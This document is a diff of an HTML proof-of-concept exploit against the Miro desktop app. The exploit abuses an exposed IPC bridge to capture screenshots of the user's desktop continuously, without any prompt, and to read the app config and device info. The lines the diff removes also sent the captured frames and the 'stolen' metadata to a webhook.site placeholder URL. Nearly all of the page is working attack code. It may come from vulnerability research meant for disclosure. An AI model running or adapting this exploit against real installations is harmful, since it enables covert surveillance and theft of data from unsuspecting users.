@@ -9,7 +9,6 @@ h1 { color: #e94560; font-size: 18px; }
 .label { color: #e94560; font-weight: bold; }
 .ok { color: #0f0; }
 .err { color: #f00; }
-.warn { color: #ff0; }
 #preview { max-width: 480px; border: 2px solid #e94560; background: #000; display: block; }
 #log { white-space: pre-wrap; font-size: 11px; max-height: 200px; overflow-y: auto; }
 .thumb-grid { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px; }
@@ -17,12 +16,7 @@ h1 { color: #e94560; font-size: 18px; }
 </style>
 </head>
 <body>
-<h1>Miro Desktop PoC — Continuous Screen Capture (No Prompt)</h1>
-
-<div class="section">
-<span class="label">Chain</span>
-<div id="chain"></div>
-</div>
+<h1>Miro Desktop PoC — Continuous Screen Capture v3</h1>
 
 <div class="section">
 <span class="label">Bridge</span>
@@ -30,24 +24,14 @@ h1 { color: #e94560; font-size: 18px; }
 </div>
 
 <div class="section">
-<span class="label">Leaked Data</span>
-<div id="leaked"></div>
-</div>
-
-<div class="section">
-<span class="label">Live Screen Capture — <span id="fps">0</span> fps, <span id="frame-count">0</span> frames</span>
+<span class="label">Live Capture — <span id="frame-count">0</span> frames</span>
 <div id="rec-status"></div>
 <canvas id="preview" width="800" height="600"></canvas>
 </div>
 
 <div class="section">
-<span class="label">Captured Keyframes</span>
+<span class="label">Keyframes</span>
 <div id="keyframes" class="thumb-grid"></div>
-</div>
-
-<div class="section">
-<span class="label">Exfiltration</span>
-<div id="exfil"></div>
 </div>
 
 <div class="section">
@@ -57,23 +41,14 @@ h1 { color: #e94560; font-size: 18px; }
 
 <script>
 /*
-  EXPLOIT: Continuous screen capture via getScreenSharingSources() IPC bridge.
-
-  getDisplayMedia() triggers a permission prompt for non-Miro origins.
-  BUT getScreenSharingSources() goes through the IPC bridge (webview-preload.js
-  -> ipcRenderer.invoke -> main.js desktopCapturer.getSources) and NEVER hits
-  setPermissionRequestHandler. Fully silent, zero prompts.
-
-  Strategy: call getScreenSharingSources() in a rapid loop (~2fps) to build
-  a continuous stream of screenshots. Each frame is a full desktop capture
-  at 800x600 as a base64 data URL.
+  MINIMAL version — ONLY uses getScreenSharingSources() in a loop.
+  No getDisplayMedia, no getMediaAccessStatus, nothing that touches
+  the web permission system. Pure IPC bridge calls only.
 */
 
-var EXFIL_URL = 'https://webhook.site/YOUR-UUID-HERE';
-var CAPTURE_INTERVAL_MS = 500;   // 2 fps
-var CAPTURE_DURATION_S = 30;     // total recording time
-var KEYFRAME_EVERY = 10;         // save every Nth frame as keyframe for display
-var EXFIL_BATCH_SIZE = 5;        // send frames in batches
+var CAPTURE_INTERVAL_MS = 500;
+var CAPTURE_DURATION_S = 30;
+var KEYFRAME_EVERY = 10;
 
 function log(msg) {
     var el = document.getElementById('log');
@@ -82,7 +57,7 @@ function log(msg) {
 }
 
 function esc(s) {
-    return String(s).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+    return String(s).replace(/</g, '&lt;').replace(/>/g, '&gt;');
 }
 
 function show(id, cls, html) {
@@ -90,103 +65,38 @@ function show(id, cls, html) {
 }
 
 (async function() {
-    // Step 1: Confirm redirect chain
-    show('chain', 'ok',
-        'Location: <b>' + esc(location.href) + '</b><br>' +
-        'Origin: <b>' + esc(location.origin) + '</b>'
-    );
-
-    // Step 2: Detect bridge
+    // Bridge check
     if (typeof _rtb_app_actions_ === 'undefined') {
-        show('bridge', 'err', '_rtb_app_actions_ NOT found');
+        show('bridge', 'err', '_rtb_app_actions_ NOT found — not in Miro webview');
         return;
     }
-    var fns = Object.keys(_rtb_app_actions_);
-    show('bridge', 'ok', '_rtb_app_actions_ ACCESSIBLE — ' + fns.join(', '));
+    show('bridge', 'ok', '_rtb_app_actions_ ACCESSIBLE — ' + Object.keys(_rtb_app_actions_).join(', '));
+    log('Bridge found');
 
-    if (typeof _rtb_app_features_ !== 'undefined') {
-        show('bridge', 'ok', '_rtb_app_features_: ' + JSON.stringify(_rtb_app_features_));
-    }
-
-    // Step 3: Steal metadata
-    var stolen = {};
+    // Steal config + device info (sync IPC, no permission needed)
     try {
-        stolen.appConfig = _rtb_app_actions_.getAppConfig();
-        show('leaked', 'ok', '<b>App Config:</b> ' + esc(JSON.stringify(stolen.appConfig)));
+        var config = _rtb_app_actions_.getAppConfig();
+        show('bridge', 'ok', 'Config: ' + esc(JSON.stringify(config)));
+    } catch(e) {}
+    try {
+        var info = _rtb_app_actions_.getDeviceInfo();
+        show('bridge', 'ok', 'Device: ' + esc(JSON.stringify(info)));
     } catch(e) {}
 
-    try {
-        stolen.deviceInfo = _rtb_app_actions_.getDeviceInfo();
-        show('leaked', 'ok', '<b>Device Info:</b> ' + esc(JSON.stringify(stolen.deviceInfo)));
-    } catch(e) {}
-
-    try {
-        stolen.mediaAccess = {
-            camera: await _rtb_app_actions_.getMediaAccessStatus('camera'),
-            microphone: await _rtb_app_actions_.getMediaAccessStatus('microphone'),
-            screen: await _rtb_app_actions_.getMediaAccessStatus('screen')
-        };
-        show('leaked', 'ok', '<b>Media Permissions:</b> ' + esc(JSON.stringify(stolen.mediaAccess)));
-    } catch(e) {}
-
-    // Step 4: Continuous screen capture loop
-    // getScreenSharingSources -> IPC -> desktopCapturer.getSources -> NO permission check
-    show('rec-status', 'ok', '<b>RECORDING STARTED</b> — ' + CAPTURE_DURATION_S + 's @ ~' + (1000/CAPTURE_INTERVAL_MS) + ' fps (no user prompt)');
-    log('Starting continuous capture: ' + CAPTURE_DURATION_S + 's, interval ' + CAPTURE_INTERVAL_MS + 'ms');
-
+    // Continuous capture via getScreenSharingSources ONLY
     var canvas = document.getElementById('preview');
     var ctx = canvas.getContext('2d');
     var frameCount = 0;
-    var fpsCounter = 0;
-    var lastFpsTime = Date.now();
     var startTime = Date.now();
     var endTime = startTime + (CAPTURE_DURATION_S * 1000);
 
-    // FPS counter
-    var fpsInterval = setInterval(function() {
-        var now = Date.now();
-        var elapsed = (now - lastFpsTime) / 1000;
-        document.getElementById('fps').textContent = (fpsCounter / elapsed).toFixed(1);
-        fpsCounter = 0;
-        lastFpsTime = now;
-    }, 1000);
+    show('rec-status', 'ok', 'RECORDING — ' + CAPTURE_DURATION_S + 's @ ~' + (1000/CAPTURE_INTERVAL_MS) + ' fps');
+    log('Capture started');
 
-    // Exfil queue
-    var exfilQueue = [];
-    var exfilRunning = false;
-
-    async function processExfilQueue() {
-        if (exfilRunning || exfilQueue.length === 0) return;
-        exfilRunning = true;
-        while (exfilQueue.length > 0) {
-            var batch = exfilQueue.splice(0, EXFIL_BATCH_SIZE);
-            try {
-                await fetch(EXFIL_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        type: 'screen-frames',
-                        frames: batch,
-                        stolen: frameCount <= EXFIL_BATCH_SIZE ? stolen : undefined
-                    }),
-                    mode: 'no-cors'
-                });
-            } catch(e) {}
-        }
-        exfilRunning = false;
-    }
-
-    // Main capture loop
     async function captureFrame() {
         if (Date.now() >= endTime) {
-            clearInterval(fpsInterval);
-            show('rec-status', 'ok', '<b>RECORDING COMPLETE</b> — ' + frameCount + ' frames captured in ' + CAPTURE_DURATION_S + 's');
-            log('Capture complete: ' + frameCount + ' frames');
-
-            show('exfil', 'warn', 'Flushing remaining frames...');
-            await processExfilQueue();
-            show('exfil', 'ok', '<b>EXFILTRATION COMPLETE</b> — ' + frameCount + ' frames sent');
-            log('All frames exfiltrated');
+            show('rec-status', 'ok', '<b>DONE — ' + frameCount + ' frames captured</b>');
+            log('Complete: ' + frameCount + ' frames');
             return;
         }
 
@@ -199,38 +109,30 @@ function show(id, cls, html) {
             });
 
             if (sources.length > 0 && sources[0].thumbnailUrl) {
-                var src = sources[0];
                 frameCount++;
-                fpsCounter++;
                 document.getElementById('frame-count').textContent = frameCount;
 
-                // Live preview on canvas
+                // Live preview
                 var img = new Image();
                 img.onload = function() {
                     ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                 };
-                img.src = src.thumbnailUrl;
+                img.src = sources[0].thumbnailUrl;
 
-                // Save keyframe thumbnails for visual proof
-                if (frameCount % KEYFRAME_EVERY === 1 || frameCount <= 3) {
+                // Keyframe thumbnails
+                if (frameCount === 1 || frameCount % KEYFRAME_EVERY === 0) {
                     var thumb = document.createElement('img');
-                    thumb.src = src.thumbnailUrl;
-                    thumb.title = 'Frame ' + frameCount + ' @ ' + new Date().toISOString().slice(11,19);
+                    thumb.src = sources[0].thumbnailUrl;
+                    thumb.title = 'Frame ' + frameCount;
                     document.getElementById('keyframes').appendChild(thumb);
                 }
 
-                // Queue for exfiltration
-                exfilQueue.push({
-                    frame: frameCount,
-                    time: Date.now() - startTime,
-                    source: src.name,
-                    data: src.thumbnailUrl
-                });
-
-                processExfilQueue();
+                if (frameCount % 10 === 0) {
+                    log('Frame ' + frameCount + ' captured');
+                }
             }
         } catch(e) {
-            log('Capture error: ' + e.message);
+            log('Error: ' + e.message);
         }
 
         setTimeout(captureFrame, CAPTURE_INTERVAL_MS);
